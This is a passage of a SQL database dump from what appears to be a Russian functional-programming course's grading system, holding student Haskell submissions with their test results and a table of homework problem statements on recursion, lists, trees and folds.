(4482, 107, '4169333', '2012-12-02 16:45:21', 0, 'data LogExpr = X | T | F |And LogExpr LogExpr |Or LogExpr LogExpr| Not LogExpr deriving Show\r\ncheck T v = True\r\ncheck F v = False\r\ncheck X T = True\r\ncheck X F = False\r\ncheck (And a b) v= (check a v) && (check b v)\r\ncheck (Or a b) v= (check a v) || (check b v)\r\ncheck (Not a) v= not (check a v)\r\ninstance Eq LogExpr where \r\n	(a) == (b)= ((check a T == check b T) && (check a F == check b F))', '<br/>Тесты успешно пройдены!'),
(4483, 106, '4169333', '2012-12-02 16:46:02', 0, 'findMajor (x:xs)= check (findMajor1 (x:xs) 1 1 x) (x:xs) 0 (length (x:xs))\r\nfindMajor1 (x:[]) n l el = el\r\nfindMajor1 (x:y:xs) n l el= if (x==y) \r\n                            then \r\n				if  (n>=l) then\r\n				findMajor1 (y:xs) (n+1) l x\r\n                                else findMajor1 (y:xs) (n+1) l el\r\n                            else \r\n			      if (n>l)\r\n                              then findMajor1 (y:xs) 1 n x\r\n                              else findMajor1 (y:xs) 1 n el \r\n\r\ncheck c [] k l= if (k > div l 2)\r\n                then  Just c\r\n                else Nothing\r\ncheck c (x:xs) k l= if (x==c) \r\n                    then check c (xs) (k+1) l\r\n	            else check c (xs) k l', '<br/>Тесты успешно пройдены!'),
(4484, 106, '63706456', '2012-12-02 16:56:58', 0, 'import Data.Maybe\r\n\r\nfindMajor ls = let	power = (div (length ls) 2) + 1\r\n			prod = nonZeroProd ls\r\n			candidate = findMaj ls prod power\r\n			in if count 0 ls >= power\r\n				then Just 0\r\n				else if candidate == Nothing \r\n					then Nothing \r\n					else if count (fromJust candidate) ls < power\r\n						then Nothing\r\n						else candidate\r\n\r\n\r\n\r\nnonZeroProd ls = foldr (x y -> if x == 0 then y else x*y) 1 ls\r\n\r\ndivides x y = (mod y x) == 0\r\n\r\nfindMaj ls pow prod = foldr (x y -> if (divides (x^pow) prod) && (isBetter x y) then Just x else y) Nothing ls\r\n\r\nisBetter x Nothing = True\r\nisBetter x (Just y) = (abs x) > (abs y)\r\n\r\ncount y (x:xs) = 	if x == y \r\n				then 1 + rec\r\n				else rec\r\n			where rec = count y xs\r\ncount _ [] = 0', 'Не удалось вычислить выражение "findMajor [1,2,3,2,2,2,1]", проверьте правильность синтаксиса'),
(4485, 123, '44060', '2012-12-02 16:57:06', 0, 'f xs = do i <- find (<5) xs \r\n	  j <- find (>10) xs \r\n	  k <- find (/=7) xs \r\n	  return (i+j+k)\r\n		where\r\n			find cond [] = Nothing \r\n			find cond (x:xs) = if cond x then (Just x) else find cond xs ', '<br/>Тесты успешно пройдены!'),
(4486, 106, '63706456', '2012-12-02 17:06:45', 0, 'findMajor ls = let	power = (div (length ls) 2) + 1\r\n			prod = nonZeroProd ls\r\n			candidate = findMaj ls power prod\r\n			in if count 0 ls >= power\r\n				then Just 0\r\n				else if candidate == Nothing \r\n					then Nothing \r\n					else if count (fromJust candidate) ls < power\r\n						then Nothing\r\n						else candidate\r\n\r\n\r\n\r\nnonZeroProd ls = foldr (x y -> if x == 0 then y else x*y) 1 ls\r\n\r\ndivides x y = (mod y x) == 0\r\n\r\nfindMaj ls pow prod = foldr (x y -> if (divides (x^pow) prod) && (isBetter x y) then Just x else y) Nothing ls\r\n\r\nisBetter x Nothing = True\r\nisBetter x (Just y) = (abs x) > (abs y)\r\n\r\ncount y (x:xs) = 	if x == y \r\n				then 1 + rec\r\n				else rec\r\n			where rec = count y xs\r\ncount _ [] = 0', 'Не удалось вычислить выражение "findMajor [1,2,3,2,2,2,1]", проверьте правильность синтаксиса'),
(4487, 106, '63706456', '2012-12-02 17:09:33', 0, 'import Data.Maybe\r\n\r\nfindMajor ls = let	power = (div (length ls) 2) + 1\r\n			prod = nonZeroProd ls\r\n			candidate = findMaj ls power prod\r\n			in if count 0 ls >= power\r\n				then Just 0\r\n				else if candidate == Nothing \r\n					then Nothing \r\n					else if count (fromJust candidate) ls < power\r\n						then Nothing\r\n						else candidate\r\n\r\n\r\n\r\nnonZeroProd ls = foldr (x y -> if x == 0 then y else x*y) 1 ls\r\n\r\ndivides x y = (mod y x) == 0\r\n\r\nfindMaj ls pow prod = foldr (x y -> if (divides (x^pow) prod) && (isBetter x y) then Just x else y) Nothing ls\r\n\r\nisBetter x Nothing = True\r\nisBetter x (Just y) = (abs x) > (abs y)\r\n\r\ncount y (x:xs) = 	if x == y \r\n				then 1 + rec\r\n				else rec\r\n			where rec = count y xs\r\ncount _ [] = 0\r\n\r\n--решение ищет произведение ненулевых чисел в списке \r\n--потом проверяет, делится ли оно на каждое число в степени длинны списка пополам +1\r\n--оставляет наибольшее по модулю число, которое делится, предварительно ещё раз проверяя\r\n--случай нуля рассмотрен отдельно\r\n--падает на примере, работающем локально\r\n--findMajor [1,2,3,2,2,2,1]\r\n--Just 2', '<br/>Тесты успешно пройдены!'),
(4488, 106, '63706456', '2012-12-02 17:09:48', 0, 'import Data.Maybe\r\n\r\nfindMajor ls = let	power = (div (length ls) 2) + 1\r\n			prod = nonZeroProd ls\r\n			candidate = findMaj ls power prod\r\n			in if count 0 ls >= power\r\n				then Just 0\r\n				else if candidate == Nothing \r\n					then Nothing \r\n					else if count (fromJust candidate) ls < power\r\n						then Nothing\r\n						else candidate\r\n\r\n\r\n\r\nnonZeroProd ls = foldr (x y -> if x == 0 then y else x*y) 1 ls\r\n\r\ndivides x y = (mod y x) == 0\r\n\r\nfindMaj ls pow prod = foldr (x y -> if (divides (x^pow) prod) && (isBetter x y) then Just x else y) Nothing ls\r\n\r\nisBetter x Nothing = True\r\nisBetter x (Just y) = (abs x) > (abs y)\r\n\r\ncount y (x:xs) = 	if x == y \r\n				then 1 + rec\r\n				else rec\r\n			where rec = count y xs\r\ncount _ [] = 0\r\n--решение ищет произведение ненулевых чисел в списке \r\n--потом проверяет, делится ли оно на каждое число в степени длинны списка пополам +1\r\n--оставляет наибольшее по модулю число, которое делится, предварительно ещё раз проверяя\r\n--случай нуля рассмотрен отдельно\r\n--падает на примере, работающем локально\r\n--findMajor [1,2,3,2,2,2,1]\r\n--Just 2', '<br/>Тесты успешно пройдены!'),
(4489, 106, '63706456', '2012-12-02 17:09:56', 0, 'import Data.Maybe\r\n\r\nfindMajor ls = let	power = (div (length ls) 2) + 1\r\n			prod = nonZeroProd ls\r\n			candidate = findMaj ls power prod\r\n			in if count 0 ls >= power\r\n				then Just 0\r\n				else if candidate == Nothing \r\n					then Nothing \r\n					else if count (fromJust candidate) ls < power\r\n						then Nothing\r\n						else candidate\r\n\r\n\r\n\r\nnonZeroProd ls = foldr (x y -> if x == 0 then y else x*y) 1 ls\r\n\r\ndivides x y = (mod y x) == 0\r\n\r\nfindMaj ls pow prod = foldr (x y -> if (divides (x^pow) prod) && (isBetter x y) then Just x else y) Nothing ls\r\n\r\nisBetter x Nothing = True\r\nisBetter x (Just y) = (abs x) > (abs y)\r\n\r\ncount y (x:xs) = 	if x == y \r\n				then 1 + rec\r\n				else rec\r\n			where rec = count y xs\r\ncount _ [] = 0\r\n--решение ищет произведение ненулевых чисел в списке \r\n--потом проверяет, делится ли оно на каждое число в степени длинны списка пополам +1\r\n--оставляет наибольшее по модулю число, которое делится, предварительно ещё раз проверяя\r\n--случай нуля рассмотрен отдельно\r\n--падает на примере, работающем локально\r\n--findMajor [1,2,3,2,2,2,1]\r\n--Just 2', '<br/>Тесты успешно пройдены!');

-- --------------------------------------------------------

--
-- Структура таблицы `task`
--

CREATE TABLE IF NOT EXISTS `task` (
  `TaskID` int(11) NOT NULL AUTO_INCREMENT,
  `TaskForHometask` int(11) NOT NULL,
  `HometaskID` int(11) NOT NULL,
  `Condition` mediumtext NOT NULL,
  `Price` int(11) NOT NULL,
  PRIMARY KEY (`TaskID`),
  UNIQUE KEY `TaskForHometask` (`TaskForHometask`,`HometaskID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=128 ;

--
-- Дамп данных таблицы `task`
--

INSERT INTO `task` (`TaskID`, `TaskForHometask`, `HometaskID`, `Condition`, `Price`) VALUES
(18, 1, 1, 'Описать функцию f n, которая вычисляет \r\n 1+1/(1+1/(1+ ...+1/1)) - n дробей\r\n\r\nПример вызова:\r\n f 3\r\nДолжно получиться 1+1/(1+1/(1+1/1)), то есть 1.6666..\r\n        \r\n        ', 1),
(19, 3, 1, 'Описать функцию \r\n sumsin n = sin(1+2+...+n)/(sin 1+sin 2+...+sin n))\r\nВ решении желательно (но не обязательно) использовать хвостовую рекурсию и накапливающие параметры.\r\n\r\nПример вызова:\r\n sumsin 2\r\nДолжно получиться sin(1+2)/(sin 1+sin 2); это равно примерно 0.08 \r\n        ', 1),
(20, 4, 1, 'Описать функцию sumfact n: \r\n sumfact n = 1!+2!+...+n!\r\nВ решении желательно (но не обязательно) использовать хвостовую рекурсию и накапливающие параметры.\r\n\r\nПример вызова:\r\nsumfact 3\r\nРезультат должен быть равен 9.\r\n        \r\n        \r\n        ', 1),
(21, 5, 1, '* Сколько существует строго возрастающих последовательностей положительных целых чисел, сумма которых равна данному числу n?\r\nНапример, для n = 9 существуют такие последовательности:\r\n 1 2 6, 1 3 5, 1 8, 2 3 4, 2 7, 3 6, 4 5, 9\r\n, то есть ответ на вопрос равен 8\r\n\r\nОпишите функцию nseq n, которая вычисляет количество таких последовательностей.\r\n\r\nПример вызова:\r\n nseq 9\r\nРезультат должен быть равен 8.\r\n        \r\n        ', 1),
(22, 1, 2, '*Дополнительная задача*\r\nОпишите функцию g, которая для данного целого числа, проверяет, можно ли его представить в виде суммы двух различных простых чисел, и возвращает True или False.\r\n\r\nПримеры вызова:\r\n  g 6 должно быть равно False\r\n  g 7 должно быть равно True (так как 7 = 2 + 5).\r\n\r\nЗамечание:\r\n О похожей (но не совсем такой же)задаче написан целый роман см. например: http://royallib.ru/book/doksiadis_apostolos/dyadyushka_petros_i_problema_goldbaha.html\r\n        \r\n        ', 1),
(23, 2, 2, '*Дополнительная задача*\r\nОпишите функцию c n, которая для данного целого числа n вычисляет, сколько есть способов представить данное число, как сумму нескольких различных положительных чисел, причем все числа должны быть попарно взаимно простыми.\r\n\r\nПример вызова:\r\n с 10 - должно получиться 6, потому что есть 6 таких последовательностей (1 2 7, 1 4 5, 1 9, 2 3 5, 3 7, 10).\r\n\r\nЗамечание: В этой задаче, видимо, не обойтись без списков, которые мы еще пока не проходили - но в ближайший четверг пройдем.\r\n\r\n*Уточнение:* Некоторые участники блестяще доказали, что эту задачу можно и без списков сделать. Замечательно, а я не догадался... \r\n        ', 1),
(24, 2, 1, 'Описать функцию b n, которая вычисляет \r\n 0+1/(1+1/(2+1/(3+ ...+1/n))) - n дробей\r\n\r\nПример вызова:\r\n b 3\r\nДолжно получиться 0+1/(1+1/(2+1/3)), то есть 0.7\r\n        \r\n        \r\n        ', 1),
(25, 1, 3, 'Описать функцию minlist, которая ищет минимальный элемент в данном списке.\r\n\r\nПример вызова:\r\n  minlist [3,2,7]\r\nОтвет должен быть равен 2.\r\n\r\nЗамечание: На самом деле, конечно, в Хаскеле есть такая стандарная функция (называется minimum), но, пожалуйста, в этой задаче вы ее не используйте.\r\n        \r\n        ', 1),
(26, 3, 3, 'Описать фунццию rev, которая для списка возвращает список из тех же элементов, но идуших в обратном порядке.\r\n\r\nПример вызова:\r\n  rev [1, 3, 7] \r\n- должен получиться список [7, 3, 1].\r\n\r\nЗамечания:\r\n- Желательно (но не обязательно) описать эту функцию так, чтобы ее время работы было O(n). Технически это означает, что желательно написать функцию, в которой не будет использоваться приписывание в конец списка с помощью ++[x].\r\n- Но, если так не получиться, присылайте любое решение, какое придумаете.\r\n- Конечно, в этой задаче нельзя использовать стандартную функцию reverse.\r\n        \r\n        \r\n        ', 1),
(29, 5, 3, 'Описать функцию checkDifferent, которая возвращает True, если все элементы в списке разные, и False, если среди них есть одинаковые.\r\n\r\nПримеры вызова:\r\n  checkDifferent [3,2,7]\r\nОтвет должен быть равен True.\r\n  checkDifferent [3,2,7,5,7,8]\r\nОтвет должен быть равен False (два раза встречается число 7).', 1),
(27, 2, 3, 'Описать функцию minsum, которая ищет минимум суммы двух стоящих рядом элементов в данном списке.\r\n\r\nПример вызова:\r\n  minsum [1,8,3,2,7]\r\nОтвет должен быть равен 5 (3+2).\r\n        ', 1),
(28, 4, 3, 'Описать функцию \r\n  check cond xs\r\n, которая для данного списка xs и логической функции cond проверяет, верно ли, что в списке есть элемент, для которого cond возвращает True. Результат должен быть равен True, если такой элемент есть, и False, если его нет.\r\n\r\nПримеры вызова:\r\n check (x->x>5) [3,2,7,4]\r\nОтвет должен быть равен True, потому что в списке есть число, большее 5 (это число 7). \r\n\r\n check (x->x<1) [3,2,7,4]\r\nОтвет должен быть равен False, потому что в списке нет чисел, меньших 1. \r\n\r\nЗамечание: И такая стандартная функция в Хаскеле есть (называется any), но, пожалуйста, в этой задаче вы ее не используйте.        \r\n        \r\n        \r\n        ', 1),
(30, 1, 4, '*Доп.задача*\r\nНаписать функцию parts, которая для данного списка проверяет, можно ли его разбить \r\nна несколько строго возрастающих кусков одинаковой длины. \r\n\r\nДлина кусков должна быть не меньше 2. Кусок может быть и только один.\r\n\r\nПримеры вызова:\r\n parts [1, 2, 8, 2, 5, 6]\r\n parts [1, 2, 3, 4, 5]\r\n parts [1, 2, 1, 2, 3, 4]\r\nВо всех этих случаях ответ должен быть равен True.\r\n parts [4, 6, 3, 5, 7]\r\nТут ответ должен быть равен False.\r\n        ', 1),
(31, 2, 4, '*Доп.задача, немного посложнее, но не очень сложная, мне кажется*\r\nНаписать функцию parts2, которая проверяет, можно ли в данном списке выбрать ровно половину элементов, чтобы\r\n- они строго возрастали\r\n- в оставшейся половине элементы тоже строго возрастали.\r\nВ этой задаче элементы не обязательно брать подряд.\r\n\r\nПримеры вызова:\r\n parts2 [1, 3, 1, 8, 4, 9]\r\nОтвет должен быть True (разбивается, например, на \r\n[1, 3, 4] и [1, 8, 9])\r\n parts2 [1, 2, 3, 5, 1, 7]\r\nответ должен быть False.\r\n\r\nЗамечания:\r\n- просто на всякий случай, если присланное решение покажется мне очень неэффективным, я могу попросить его улучшить, даже если всегда дает правильные результаты \r\n- честно говоря, я не знаю, какое в этой задаче лучшее решение. Присылайте ваши варианты, обсудим)        \r\n        \r\n        ', 1),
(34, 2, 5, '*Доп. задача*\r\nОчень простая функция высшего порядка на C++\r\n\r\nНаписать на C++ шаблон функции integral, которая позволяет вычислять определенный интеграл на данном интервале. У нее должны быть быть 3 параметра:\r\n- f - функция или лямбда выражение \r\n- a, b - пределы интегрирования.\r\nПример вызова:\r\n\r\n   double result = integral([](double x) { return x*x; }, 0, 1);\r\n\r\nМетод интегрирования можно взять любым, самым простым. Например, разбить отрезок на 100 равных частей и использовать метод прямоугольников или метод трапеций. \r\n\r\nПро то, зачем эти задачки, как их сдавать и т.д. см. http://msimuni.wikidot.com/fp-dop2\r\n        \r\n        \r\n        ', 1),
(33, 1, 5, '*Доп. задача*\r\nОчень простая функция высшего порядка на C#\r\n\r\nНаписать на C# функцию (статический метод) integral, которая позволяет вычислять определенный интеграл на данном интервале. У нее должны быть быть 3 параметра:\r\n- f - функция (статический метод или лямбда выражение) \r\n- a, b - пределы интегрирования.\r\nПример вызова:\r\n\r\n   double result = integral(x => x*x, 0, 1);\r\n\r\nМетод интегрирования можно взять любым, самым простым. Например, разбить отрезок на 100 равных частей и использовать метод прямоугольников или метод трапеций.\r\n\r\nПро то, зачем эти задачки, как их сдавать и т.д. см. http://msimuni.wikidot.com/fp-dop2\r\n        \r\n        ', 1),
(35, 1, 6, 'Опишите функцию isosc (от слова isosceles - равнобедренный), у которой три параметра - пары целых чисел, и которая возвращает True, если соответствующие точки на плоскости задают равнобедренный треугольник, а иначе False.\r\n\r\nПримеры вызова:\r\n  isosс (0, 2) (2, 0) (2,2)\r\n     - результат должен быть равен True\r\n  isosс (-3, 2) (2, 0) (2,2)\r\n     - результат должен быть равен False\r\n        \r\n        ', 1),
(36, 2, 6, 'Описать функцию cubeTable, которая для данного n возвращает список пар чисел (i, i в кубе) для всех i от 1 до n.\r\n\r\nДополнительное условие: _Нельзя_ определять свои рекурсивные функции. Т.е. можно (и нужно) использовать стандартные функции. Можно (но, видимо, особо не нужно), определять свои не рекурсивные функции.\r\n\r\nПример вызова:\r\n  cubeTable 4\r\nДолжно получиться [(1, 1), (2, 8), (3, 27), (4, 64)]\r\n        ', 1),
(37, 3, 6, 'Определить функцию minsum, такую же, как в задаче 3.2. Т.е. функция должна искать минимум суммы двух стоящих рядом элементов в данном списке.\r\n\r\nДополнительное условие: _Нельзя_ определять свои рекурсивные функции. Т.е. можно (и нужно) использовать стандартные функции. Можно (но не очень нужно), определать свои не рекурсивные функции.\r\n\r\nПример вызова:\r\n minsum [1,8,3,2,7] \r\nОтвет должен быть равен 5 (3+2).\r\n\r\n        \r\n        ', 1),
(38, 4, 6, 'Описать функцию height, хоторая ищет высоту данного дерева. \r\n\r\nЗамечание: В задаче вы сначала должны описать data для дерева. И его надо описать точно так же, как на занятии. Извините за ограничение вашей творческой свободы, но это, понятно, ограничение системы тестирования..\r\n\r\nПримеры вызова:\r\n  height (Node 1 Empty Empty)\r\nОтвет должен быть 0\r\n  height (Node 1 (Node 1 Empty Empty) Empty)\r\nОтвет должен быть 1\r\n        \r\n        \r\n        ', 1),
(39, 5, 6, '* Описать функцию minHeight, хоторая для данного дерева возвращает минимум расстояния от корня до какого-нибудь листа. \r\n\r\nЗамечание: В этой задаче _обязательно_ должна быть реализована оптимизация, о которой мы говорили на занятии.\r\n\r\nНапоминание: Лист - это вершина, у которой и левое и правое поддеревья пустые.\r\n\r\nПримеры вызова:\r\n  minHeight(Node 1 Empty Empty)\r\nОтвет должен быть 0\r\n  minHeight (Node 1 \r\n               (Node 2 \r\n                  (Node 3 Empty Empty)\r\n                   Empty)\r\n               (Node 4 Empty Empty))\r\nОтвет должен быть 1 (расстояние от корня до вершины 4)\r\n        ', 1),
(40, 6, 6, '"Рамочка"\r\n\r\nПусть мы используем списки списков, чтобы представлять в Хаскеле двумерные массивы. Описать функцию frame n, которая возвращает список списков, соответствующий массиву n на n, в котором по краям (в первом и последнем столбце и в первой и последней строке) все элементы равны 1, а все остальные элементы равны 0.\r\n\r\nПример вызова:\r\n  frame 4\r\nДолжно получиться:\r\n [[1, 1, 1, 1],\r\n  [1, 0, 0, 1],\r\n  [1, 0, 0, 1],\r\n  [1, 1, 1, 1]]\r\n\r\n        ', 1),
(41, 7, 6, 'Опишите две функции, countOdd и countOdd1, которые для данного списка вычисляют количество нечетных чисел в этом списке. (Т.е. надо написать две версии одной функции).\r\n\r\nДополнительные условия:\r\n- В функции countOdd можно использовать _только_ стандартную функцию foldr. Можно (но особо не нужно) задавать свои нерекурсивные функции. Можно,  \r\nконечно, использовать лямбда-выражения.\r\n\r\n- В функции countOdd1 можно использовать любые стандартные функции, и тоже, если надо, можно использовать свои нерекурсивные функции и лямбда-выражения. Но _нельзя_ определять свои рекурсивные функции.\r\n\r\nПример вызова:\r\n  countOdd [2, 3, 4, 8, 5, 33, 9]\r\nОтвет должен быть равен 4\r\n\r\n        ', 1),
(42, 8, 6, 'Опишите функцию myfoldl, которая делает точно то же, что и стандартная функция foldl (т.е. сворачивает все элементы слева направо).\r\n\r\nПример вызова:\r\n  myfoldl (+) 0 [1,2,3]\r\nФункция должна вычислить ((0+1)+2)+3, причем вычисления должны происходить именно в таком порядке.  ', 1),
(43, 1, 7, '*Доп задача, до 7.10*\r\nУ функции два параметра - целые числа a и b. Точно известно, что они взаимно простые. Функция должна вернуть такую пару целых чисел x и y, что a*x + b*y == 1. (Таких пар, конечно, бесконечно много, можно вернуть любую).\r\n\r\nПример вызова:\r\n euclid 3 5\r\nДолжно получиться (2, -1), потому что 3*2+5*(-1) == 1\r\n\r\nЗамечания:\r\n- Если a и b не взаимно простые, то функция может делать что угодно (например, аварийно завершаться, или выдавать любой ответ).\r\n- Желательно, чтобы функция быстро работала для _очень_ больших чисел, например, для 2^100 и 3^100. Но, если не получится, напишите любое решение, не обязательно очень эффективное (например, которое ищет решения перебором).\r\n- Подсказка: идея, которую можно использовать для эффективного решения, была впервые опубликована примерно в 300 г. до н.э. :)\r\n        \r\n        ', 1),
(44, 2, 7, '*Доп задача, до 7.10*\r\nОписать функцию dioph, параметры которой - два списка из 4 целых чисел [a, b, c, d] и [k, l, m, n], и которая возвращает список из 3 целых чисел [x, y, z] таких, что:\r\n\r\na*x+b*y+c*z=d\r\nk*x+l*y+m*z=n\r\n\r\nЗамечания: \r\n- Что делать, если таких чисел нет - на ваше усмотрение. Можно выдать ошибку, можно вернуть (0, 0, 0) и т.д. В тестах таких случаев не будет.\r\n- Числа в тестах могут быть достаточно большими для того, чтобы эту задачу не было смысла решать простым перебором, надо придумать что-то более эффективное.\r\n- Эта задача не то чтобы очень сложная, но решение, которое я знаю - довольно громоздкое, в нем надо рассматривать разные вырожденные случаи и т.д.. Т.е. это для тех, кому интересно решить что-то немного посложнее.\r\n        \r\n        ', 1),
(45, 1, 8, '*Задача (скорее упражнение) на C# (дополнительная,  до 8.10 включительно*\r\n\r\nВ С# для контейнеров определен метод Any, который позволяет проверить, есть ли в контейнере элемент, удовлетворяющий данному условию. И есть аналогичный метод All.  Вот примеры их вызовов:\r\n\r\n  int [] a = {-1, 2, -3, 4};\r\n  bool b = a.Any(x => x > 0);     // Верно, ли что в массиве есть положительный элемент?\r\n  b = a.All(x => x > 0);         // Верно, ли что все элементы в массиве положительные?\r\n\r\nИспользуя только эти методы и лямбда выражения, проверить для данного двумерного массива массивов (или, если хотите, списка списков), \r\nчто в каждом из массивов есть хотя бы один четный элемент.\r\n\r\nЗамечания:\r\n- На эту задачу тестов нет, вы просто можете выложить в систему код на С#, и я его просмотрю.\r\n- Но код должен быть таким, чтобы его можно было скомпилировать и запустить, с каким-нибудь примером вызова.\r\n- Просто как информация, на самом деле All и Any определены не только для контейнеров, а еще много для чего.\r\n        ', 1),
(46, 2, 8, '*Простая задача (скорее упражнение) на C++ (дополнительная, до 8.10 включительно)**\r\n\r\nВ С++ нет стандартной функции, аналогичной Any. Но есть функция find_if, которая еще более мощная, она возвращает итератор для найденного элемента.\r\n\r\nИспользуя только функцию find_if и лямбда выражение, проверить для данного одномерного массива (или, если хотите, списка, вектора и т.д.)\r\n верно ли, что в нем есть хотя бы один четный элемент?\r\n\r\nЗамечания: \r\n- Тут задание состоит просто в том, чтобы найти описание find_if и понять, как его вызывать, вот и все.\r\n- Остальные замечания такие же, как и задаче 8 - 1: решение должна содержать компилируемй код с примером вызова; его можно выкладывать в систему, хоть это и не программа на Хаскеле - но тестов там нет, я посмотрю глазами.\r\n        \r\n        ', 1),
(47, 1, 9, '*Доп задача, до 14.10*\r\nОписать функцию powerset, которая по списку порождает список из всех его подсписков.\r\n\r\nПример вызова:\r\n powerset [1, 2, 3]\r\nРезультат д.б. равен [[], [1], [2], [3], [1, 2], [1, 3], [2, 3], [1, 2, 3]]. (Порядок элементов в ответе м.б. и другим, как вам удобнее).\r\n        ', 1),
(48, 2, 9, '*Доп задача, до 14.10*\r\nИспользуя _только_ функцию foldr и лямбда выражения опишите функцию myreverse, возвращающую элементы списка в обратном порядке.\r\nПример вызова:\r\n myreverse [1, 2, 3]\r\nРезультат д.б. равен [3, 2, 1].\r\n\r\nДополнительные условия:\r\n- В этой задаче можно использовать только функцию foldr и лямбда выражения. Можно (но особо не нужно) определять свои не рекурсивные функции.\r\n- Функция должна работать за линейное время. Технически это означает, что нельзя использовать операцию ++ [x] или каким-то другим способом приписывать очередной элемент к концу списка на каждом шаге работы foldr. \r\n- (ДОБАВЛЕНИЕ) Чтобы задача была немного еще посложнее, давайте пусть будет еще дополнительно условие - нельзя использовать пары (tuples). (И соответственно нельзя каким-то образом их имитировать, с помощью списков из двух элементов или data и т.д.)\r\n\r\nЗамечания:\r\n- Обратите внимание, надо использовать именно foldr, а не foldl. С foldl то все просто..\r\n- Эта задача не очень простая. Точнее, решение у нее довольно простое и короткое, но додуматься до него, м.б. и не так просто. Если не получиться, не расстраивайтесь..\r\n        \r\n        ', 1),
(49, 1, 10, '*Доп.задача, до 15.10*\r\nОписать на C# тип "двоичное дерево, элементы которого - целые числа". Для этого дерева опишите аналог функции Any, которая обсуждалась в задаче 7.1. У этой функции должен быть параметр "условие" - логическая функция, и она должна проверять, есть ли a дереве элемент, удовлетворяющий условию.\r\n\r\nТ.е. решение должно состоять из программы на C#, в которой:\r\n- описан тип "дерево"\r\n- описана функция, аналогичная Any, но для дерева. Это может быть метод класса "дерево", или отдельная статическая функция, как хотите.\r\n- приведен пример вызова, т.е. создано какое-то дерево, хоть самое просто, из двух-трех вершин, и для него вызвана функция Any. \r\n\r\nСправка: Логические функции можно описать как Function<int, bool>. (Или можно описать как Predicate<int> - это одно и то же.)\r\n\r\nЗамечания:\r\n- Проще всего весь код записать в одном файле, и поместить в систему тестирования. Но, если хотите, вы можете создать несколько файлов (один для дерева, другой для Main) и прислать мне их по почте.\r\n- Эта задача, конечно, немного посложнее предыдущих по C# - те были, скорее, упражнениями. Если что-то будет не получатся, можете писать и задавать вопросы..\r\n        \r\n        ', 1),
(50, 2, 10, '*Доп.задача, до 15.10*\r\nОписать на C++ тип "двоичное дерево, элементы которого - целые числа". Для этого дерева опишите что-то похожее на функцию Any из задачи 7.1. \r\n\r\nВ этом случае, видимо, проще всего описать шаблон функции any, примерно так же, как мы описывали шаблон для интеграла. Один из параметров этой функции - условие, которое надо проверить, в другой - корень дерева (или указатель на корень дерева, как будет удобнее).\r\n\r\nТ.е. решение должно состоять из программы на C++, в которой:\r\n- описан тип "дерево"\r\n- описана шаблон функции, аналогичной Any из 7.1, но для дерева.\r\n- приведен пример вызова, т.е. создано какое-то дерево, хоть самое просто, из двух-трех вершин, и для него вызван этот шаблон. \r\n\r\nЗамечания:\r\n- Замечания те же, что 10.1. Эта задача, конечно, немного посложнее предыдущих по C++. Если что-то не получается или непонятно, можете задавать вопросы..\r\n        \r\n        ', 1),
(51, 1, 11, 'Определите функцию repeatFunc с двумя параметрами f и n, которая возвращает функцию f.f. ... .f (т.е. композицию функции с самой собой n раз).\r\nПример вызова:\r\n\r\n  f = repeatFunc sin 3\r\n\r\n  должно определить f x = sin (sin (sin x))\r\nи после этого можно написать, например, f 2 и получить sin (sin (sin 2))- это примерно 0.7097.\r\n        ', 1),
(52, 2, 11, 'Определите функцию repeatFunc с двумя параметрами f и n, которая возвращает функцию f.f. ... .f (т.е. композицию функции с самой собой n раз).\r\nПример вызова:\r\n\r\n  f = repeatFunc sin 3\r\n\r\n  должно определить f x = sin (sin (sin x))\r\nи после этого можно написать, например, f 2 и получить sin (sin (sin 2))- это примерно 0.7097.\r\n\r\nДополнительное условие:\r\n - В этой задаче нельзя определять свои рекурсивные функции. Можно использовать стандартные функции и можно, если хотите, определять нерекурсивные функции.\r\n\r\nЗамечание:\r\n - Если вы решите эту задачу, то можете выложить ее решение и как решение для задачи 11.1, оно будет засчитано.\r\n        ', 1),
(53, 3, 11, 'Перечислить все способы выдать данную сумму n монетами по 2, 3 и 5 коп. Результат должен быть списком списков целых чисел, каждый внутренний список - это список из трех элементов [k,l,m], где k - двухкопеечных  монет, l - количество трехкопеечных, m - количество пятикопеечных монет.\r\n\r\nПример вызова:\r\n  coins 10\r\n\r\nДолжно получиться:\r\n [[5,0,0],[2,2,0],[0,0,2],[1,1,1]]\r\n(порядок троек в ответе может быть и другим).\r\n\r\nЗамечание:\r\n - Вообще это упражнение на list comprehension. Но, если хотите, вы можете решить задачу и без list comprehension, как хотите.\r\n        \r\n        \r\n        ', 1),
(54, 4, 11, 'Пусть мы хотим описывать в программе на Хаскеле электрические схемы. Мы считаем, что электрическая схема - это:\r\n - или сопротивление, тогда известно его величина в омах\r\n - или две схемы, соединенных параллельно\r\n - или две схемы, соединенных последовательно\r\n(На самом деле есть схемы, которые таким способом не описать, ну и ладно..)\r\n\r\n1. Опишите тип (data) Scheme, который позволяет описывать такие схемы.\r\n2. Опишите функцию totalResistance, у которой один параметр - схема, и которая возвращает значение общего сопротивления для этой схемы.\r\n\r\nНапример, для двух сопротивлений 4 Ом, соединенных последовательно, функция должна возвращать 8, а для двух сопротивлений 4 Ом, соединенных параллельно, функция должна возвращать 2.\r\n\r\nЗамечания:\r\n- Для этой задачи тестов не будет, потому что я не знаю, как вы решите представлять схемы. Но я проверю задачи вручную.\r\n- Если вы забыли, как считать общее сопротивление схемы - напишите, я подскажу :)\r\n        \r\n        ', 1),
(56, 1, 12, '*Доп.задача, до 21.10*\r\nОписать функцию allLists с двумя параметрами n и k, которая возвращает список из всех списков длины k, которые можно составить из чисел 1..n. \r\n\r\nПример вызова:\r\n allLists 3 2\r\n\r\nДолжно получиться:\r\n [[1,1],[1,2],[1,3],[2,1],[2,2],[2,3],[3,1],[3,2],[3,3]]\r\n\r\n(не обязательно именно в таком порядке).\r\n\r\nЗамечания:\r\n- В общем случае в списке должно быть, понятно, n^k элементов.\r\n- Эта задача, мне кажется, совсем не сложная\r\nПодсказка: Я бы советовал использовать list comprehension, получится очень просто.\r\n\r\n        \r\n        ', 1),
